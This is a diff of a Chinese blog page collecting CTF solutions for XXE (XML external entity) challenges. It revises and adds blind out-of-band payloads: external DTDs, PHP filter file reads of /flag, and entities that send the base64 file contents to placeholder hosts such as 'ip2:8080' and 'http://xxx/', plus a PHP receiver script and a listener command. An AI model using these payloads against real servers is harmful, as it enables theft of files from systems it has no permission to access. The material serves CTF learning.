@@ -199,7 +199,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2022/09/03/xxe%E8%A7%A3%E9%A2%98%E5%90%88%E9%9B%86/">xxe解题三方面</a>
+      <a class="article-title" href="/2022/09/03/xxe%E8%A7%A3%E9%A2%98%E5%90%88%E9%9B%86/">xxe解题合集</a>
     </h1>
   
 
@@ -227,19 +227,31 @@
 <p>先%dtd调用，请求了<a target="_blank" rel="noopener" href="http://ip/evil.dtd%EF%BC%8C%E8%BF%99%E4%B8%AAdtd%E9%87%8C%E9%9D%A2%E5%B0%86%start;%goodies;%end%E7%9A%84%E5%80%BC%E9%83%BD%E8%B0%83%E7%94%A8%EF%BC%8C%E8%B5%8B%E7%BB%99%E4%BA%86all%EF%BC%8C%E4%B8%8B%E9%9D%A2%E7%9A%84&amp;all%E5%8F%98%E9%87%8F%E5%B0%B1%E8%83%BD%E6%98%BE%E7%A4%BA%E5%87%BA%E7%BB%93%E6%9E%9C%E4%BA%86">http://ip/evil.dtd，这个dtd里面将%start;%goodies;%end的值都调用，赋给了all，下面的&amp;all变量就能显示出结果了</a></p>
 <p>5.无回显读取本地敏感文件</p>
 <p>payload</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE convert [ </span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://ip/test.dtd&quot;&gt;</span><br><span class="line">%remote;%int;%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE convert [ </span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://ip1/test.dtd&quot;&gt;</span><br><span class="line">%remote;%int;%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
 
 <p>test.dtd</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///D:/test.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://ip/xxe.php?p=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://ip2:8080?p=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$xxe</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>]);</span><br><span class="line"><span class="variable">$txt</span> = <span class="string">&#x27;flag.txt&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$txt</span>,<span class="variable">$xxe</span>,FILE_APPEND)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-
+<p>然后在ip2的终端上监听这个端口，python -m http.server 8080</p>
 <p>我们从 payload 中能看到 连续调用了三个参数实体 %remote;%int;%send;，这就是我们的利用顺序，%remote 先调用，调用后请求远程服务器上的 test.dtd ，有点类似于将 test.dtd 包含进来，然后 %int 调用 test.dtd 中的 %file, %file 就会去获取服务器上面的敏感文件，然后将 %file 的结果填入到 %send 以后(因为实体的值中不能有 %, 所以将其转成html实体编码 <code>%</code>)，我们再调用 %send; 把我们的读取到的数据发送到我们的远程 vps 上，这样就实现了外带数据的效果，完美的解决了 XXE 无回显的问题。</p>
 <p>上面那是大佬写的，我自己的理解就是</p>
 <p>%remote就是调用% remote的替换值，现在已经打开了test.dtd这个文件，然后%int就调用了% int的替换值，也就是<!ENTITY &#37; send SYSTEM 'http://ip:9999?p=%file;'>，因为send的值已经是最后要显示出来的结果了，所以就不能有%，所以将他转成实体编码，最后的%send就调用了% send的值，也就是<a target="_blank" rel="noopener" href="http://ip:9999/?p=%25file%EF%BC%8C%E8%BF%99%E9%87%8C%E5%8F%88%E4%BC%A0%E5%85%A5%E4%BA%86%E4%B8%80%E4%B8%AA%E5%8F%82%E6%95%B0%25file%EF%BC%8C%25file%E5%8F%88%E8%B0%83%E7%94%A8%E4%BA%86%25">http://ip:9999?p=%file，这里又传入了一个参数%file，%file又调用了%</a> file的值，php://filter/read=convert.base64-encode/resource=file:///D:/test.txt页面所显示的结果就是p的值</p>
 <p>这整个过程就是一个服务器向另一个服务器发起请求，相当于另类的ssrf</p>
+<p>另一种解法</p>
+<p>以下的<a target="_blank" rel="noopener" href="http://xxx/%E6%8C%87%E4%BB%A3%E6%9C%8D%E5%8A%A1%E5%99%A8IP%EF%BC%8C%E6%A0%B9%E6%8D%AE%E8%87%AA%E5%B7%B1%E6%83%85%E5%86%B5%E6%9B%BF%E6%8D%A2">http://xxx/指代服务器IP，根据自己情况替换</a></p>
+<p>pd.dtd</p>
+<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&lt;!ENTITY % all</span><br><span class="line">&gt;&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://xxx/xxe.php?q=%file;&#x27;&gt;&quot;</span><br><span class="line"></span><br><span class="line">&gt;&gt;%all;</span><br><span class="line">&gt;新建用于接收的php</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>xxe.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$xxe = base64_decode($_GET[&#x27;q&#x27;]);</span><br><span class="line">$txt = &#x27;flag.txt&#x27;;</span><br><span class="line">file_put_contents($txt,$xxe,FILE_APPEND)</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>Payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://xxx/pd.dtd&quot;&gt;</span><br><span class="line">%dtd;</span><br><span class="line">%send;</span><br><span class="line">] &gt;</span><br></pre></td></tr></table></figure>
+
+<p>如果运行正常这时自己创建的flag.txt文件里面已经写入内容了</p>
 
       
     </div>
@@ -770,7 +782,7 @@
           </li>
         
           <li>
-            <a href="/2022/09/03/xxe%E8%A7%A3%E9%A2%98%E5%90%88%E9%9B%86/">xxe解题三方面</a>
+            <a href="/2022/09/03/xxe%E8%A7%A3%E9%A2%98%E5%90%88%E9%9B%86/">xxe解题合集</a>
           </li>
         
           <li>
